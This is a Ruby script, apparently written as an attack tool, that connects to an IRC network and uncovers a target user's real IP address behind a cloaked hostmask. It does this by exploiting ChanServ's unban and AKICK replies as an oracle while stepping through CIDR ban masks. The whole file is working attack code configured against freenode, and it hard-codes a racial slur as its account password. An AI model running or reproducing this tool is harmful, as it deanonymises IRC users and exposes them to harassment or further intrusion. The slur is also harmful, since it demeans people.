#!/usr/bin/env ruby
# encoding: utf-8
#
# See through cloaked client hostmasks and virtual hosts enabled by HostServ or ircd.conf.
#
# Target: atheme-services
# Tested on: ircd-seven
#
# NO! I didn't use the cinch gem; don't panic--I'm fluent in raw IRC.
#

require 'socket'

module Cloak
  DEBG = true # Print debugging messages?
  WARN = true  # Display warning info?
  ALTN = 1     # Number of alternate technique to use {:0 => default, :1 => AKICK }

  # Initialize hashed configuration data storage constants
  ERRO,CONF,CHAT,SVCS = {},{},{},{}

  SVCS[:mail] = 'hotmail.com' # Note: FreeNode's NickServ does not allow registration of e-mails from mailinator.com
  SVCS[:pass] = 'nigger'

  # Numeric reply assignments
  REPL = {:USERHOST=>302,:NAMREPLY=>353,:ENDOFNAMES=>366,:ENDOFMOTD=>376}

  # Numeric error assignments
  ERRO[:NICKNAMEINUSE] = 433

  ABBR = true # false to expand 'CS' and 'NS' abbreviations to an RFC-compliant PRIVMSG command

  CHAT[:nick] = 'xyz0'
  CHAT[:host] = 'irc.freenode.net.'
  CHAT[:port] = '6667'
  CHAT[:duck] = 'beo'
  CHAT[:user] = 'msftwin'
  CHAT[:gcos] = '*Unknown*'
  CHAT[:chan] = '##xyz0'
  CHAT[:quit] = 'cya!'
  CHAT[:trgc] = '#tcmd'

  ######################################################################################
  ### DO NOT CHANGE ANYTHING BELOW THIS LINE UNLESS YOU 4REAL KNOW WTF YOU'RE DOING! ###
  ######################################################################################

  def vexit(enum, aexc)
    STDERR.puts "#{afil}:#{alin} #{aexc}"
    STDERR.puts aexc.backtrace.join("\n") if DEBG

    exit enum
  end

  def ioerr(afil, alin, astr)
    return IOError.new('') if afil.nil? or afil.empty?

    astr.strip! if astr

    if alin.nil? or alin.zero?
      if astr.nil? or astr.empty?
        IOError.new("(#{afil}) ERROR!")
      else
        IOError.new("(#{afil}) ERROR: #{astr}!")
      end
    else
      if astr.nil? or astr.empty?
        IOError.new("(#{afil}:#{alin}) ERROR!")
      else
        IOError.new("(#{afil}:#{alin}) ERROR: #{astr}!")
      end
    end
  end

  class Clone
    ######################################################################################
    ### DO NOT CHANGE ANYTHING BELOW THIS LINE UNLESS YOU 4REAL KNOW WTF YOU'RE DOING! ###
    ######################################################################################

    BANS = [' *!*@0.0.0.0/2 *!*@64.0.0.0/2 *!*@128.0.0.0/2 *!*@192.0.0.0/2'] # 1st CIDR block-based ban stack string
    DOT4 = ['.', '.', '.', ''] # auxiliary IPv4 dotted-quad array
    INIT = [[0, 64, 128, 192], [2, 10, 18, 26]] # Initial /30 chunks and in-order per-byte CIDR bit increments
    CIDR = [256, 128, 64, 32, 16, 8, 4, 2, 1, 0] # 2**8 countdown
    MASK = ' *!*@' # "<SP>nick!user@" initial part of ban mask

    attr_reader :nick, :user, :mail, :gcos, :chan, :duck, :quit, :host, :port

    def ucputs(astr = '')
      return nil if !(astr and astr.size > 0)

      astr.strip!

      sleep rand 0.32

      if ABBR
        sleep(0.84 + rand(1.44 + rand(1.22))) if rand(3).even?
      else
        astr.sub!(%r{^CS}i, 'PRIVMSG ChanServ :') if astr.upcase.start_with?('CS')
        astr.sub!(%r{^NS}i, 'PRIVMSG NickServ :') if astr.upcase.start_with?('NS')

        sleep(1.2 + rand(1.8 + rand(1.4))) if rand(4).even?
      end # if ABBR

      printf('%02d ', @arnd)
      puts "[#{Time.now.asctime}] #{astr}"

      @sock.puts astr
    end # def ucputs

    def getout(qmsg = 'Leaving')
      begin
        ucputs("QUIT #{qmsg}")

        @sock.close
      rescue Exception => e
        STDERR.puts e.inspect
        STDERR.puts e.backtrace.join("\n") if DEBG

        exit -1
      end

      exit 1
    end

    # SnAp y0 FiNGaZ!
    def initialize(aduq = '')
      #['TERM','INT'].each { |s| Signal.trap(s) { getout("Caught SIG#{s}!") } }
      @arnd = rand(Time.now.sec % 32).to_s
      @chan,@host,@port = CHAT[:chan].downcase,CHAT[:host],CHAT[:port].to_i
      @amod = "MODE #{@chan} +bbbb" # Raw IRC quad-stacked CMODE +b command bootstrap

      vexit(-2, ioerr(__FILE__, __LINE__, "Invalid port #{CHAT[:port]}")) if @port <= 0 or @port > 65535

      @sock = TCPSocket.new(@host, @port)

      STDERR.puts '[%] Connected!' if DEBG

      @nick,@user = CHAT[:nick].downcase, CHAT[:user].downcase
      @mail,@gcos,@pass = SVCS[:mail],CHAT[:gcos],SVCS[:pass]
      @duck,@quit = CHAT[:duck],CHAT[:quit]
      @duck = aduq if !aduq.empty?

      ucputs "NICK #{@nick}"
      ucputs "USER #{@user} . . :#{@gcos}"

      loop do
        begin
          aline = @sock.readline

          aline.rstrip!

          printf('%02d ', @arnd)
          puts("[#{Time.now.asctime}] #{aline}")

          if aline.include?(" #{ERRO[:NICKNAMEINUSE]} ")
            ucputs("NICK #{@nick << rand(9).to_s}")

            next

            s = '!NICKNAMEINUSE'

            STDERR.puts s

            return s
          end

          break if aline.include?(" #{REPL[:ENDOFMOTD]} ")
        rescue Exception => e
          STDERR.puts e.inspect
          STDERR.puts e.backtrace.join("\n") if DEBG
        end # begin
      end # loop do

      ucputs "NS REGISTER #{@pass} #{@user}@#{@mail}" # if ALTN != 1
      ucputs "NS ID #{@nick} #{@pass}"
      ucputs "CS SET #{@chan} MLOCK OFF"
      sleep 2
      ucputs "JOIN #{@chan} #{@ckey}"
      ucputs "CS CLEAR #{@chan} BANS"
      ucputs "USERHOST #{@duck}"
      sleep 2
      ucputs "CS REGISTER #{@chan}" # if ALTN != 1
      ucputs "CS OP #{@chan} #{@nick}"
      ucputs "MODE #{@chan} +nsti"
      sleep 2

      ### CAWSHUN: K0ADZ 4 EWEET IRC WARRI0RZ _ONLY_
      @abit,@aoct,@anum,@anip = 2,0,-1,['0','0','0','0']
      @aban,@umsk = @amod.dup,nil
      @aban << BANS.first

      ucputs @aban

      if ALTN == 1
        ucputs "CS AKICK #{@chan} ADD #{@duck} !P"
        ucputs "CS AKICK #{@chan} DEL #{@duck}"
      else
        ucputs "CS UNBAN #{@chan} #{@duck}"
      end

      loop do
        begin
          aline = @sock.readline

          aline.rstrip!

          printf('%02d ', @arnd)
          puts "[#{Time.now.asctime}] #{aline}"

          aline.downcase!

          if aline.start_with?('ping')
            ucputs("PONG #{aline.split.last}")

            next
          end

          if aline.include?(" #{REPL[:USERHOST]} ")
            @umsk = aline.split(':').last

            next
          end

          if aline.start_with?(':chanserv!') and aline.include?(" mode #{@chan} -b")
            bnstr = aline.split('-b').last.split('/').first

            bnstr.gsub!(%r{[ *!@]+}, '')

            @aban,@anum = @amod.dup,bnstr.split('.')[@aoct].to_i
            @anip[@aoct] = @anum.to_s

            if !((@abit % 8).zero?)
              @abit += 1

              4.times do |t|
                @aban << MASK

                STDERR.puts "HERE: @anum: #{@anum} t: #{t} @aoct: #{@aoct}" if DEBG

                case @anum
                  when 0
                    0.upto(3) do |j|
                      if j == @aoct
                        @aban << (@anum + CIDR[@abit] * t).to_s
                      else
                        @aban << @anip[j]
                      end

                      @aban << DOT4[j]
                    end
                  when 256
                    0.upto(3) do |m|
                      if m == @aoct
                        @aban << (@anum - CIDR[@abit] * t).to_s
                      else
                        @aban << @anip[m]
                      end

                      @aban << DOT4[m]
                    end
                  else
                    STDERR.puts "WHERE: @anum = #{@anum} t = #{t} @aoct = #{@aoct}" if DEBG

                    0.upto(3) do |n|
                      if n == @aoct
                        @aban << (@anum + CIDR[@abit] * t).to_s
                      else
                        @aban << @anip[n]
                      end

                      @aban << DOT4[n]
                    end # 0.upto(3)
                  end # case @anum

                  @aban << "/#{@abit + 8 * @aoct}"
                end # 4.times
              else # if !((@abit % 8).zero?)
                @abit = 2
                @aoct += 1

                if @aoct == 4
                  #$# PHULL PJEERNESS
                  #%# qwnzed teh full addr!1!*wO0p!*wO0p!*PuLL oVeR m0FO!@#
                  #%# *w0Op!*wO0p!*Krad9 unit pig tail-n ewe phewlz!*w0Op!*w00p!*
                  #$# PHULL PJEERNESS
                  puts "*** <#{CHAT[:duck]}:#{CHAT[:trgc]}> => #{@umsk} => #{bnstr}"

                  ucputs("CS CLEAR #{@chan} BANS")
                  ucputs("QUIT #{@quit}")

                  @sock.close

                  return bnstr
                end

                4.times do |z|
                  STDERR.puts "THERE: @abit = #{@abit} @aoct = #{@aoct} z = #{z} @aban = #{@aban}" if DEBG

                  @aban << MASK

                  for i in 0 .. 3
                    if i == @aoct
                      @aban << INIT.first[z].to_s
                    else
                      @aban << @anip[i]
                    end

                    @aban << DOT4[i]
                  end

                @aban << "/#{@abit + 8 * @aoct}"
              end # 4.times

              @abit += 1
            end # else

            ucputs @aban

            if ALTN == 1
              ucputs "CS AKICK #{@chan} ADD #{@duck} !P"
              ucputs "CS AKICK #{@chan} DEL #{@duck}"
            else
              ucputs "CS UNBAN #{@chan} #{@duck}"
            end
          end # if aline.include?
        rescue Exception => e
          STDERR.puts e.inspect
          STDERR.puts e.backtrace.join("\n") if DEBG
        end # begin
      end # loop do

      true
    end # def initialize
  end # class
end # Module Cloak

include Cloak

# Invokes main initialize method in the Clone class of the Cloak module
athr = Thread.new { Clone.new(CHAT[:duck]) }
aret = athr.join

STDERR.puts aret.inspect if WARN

exit 0
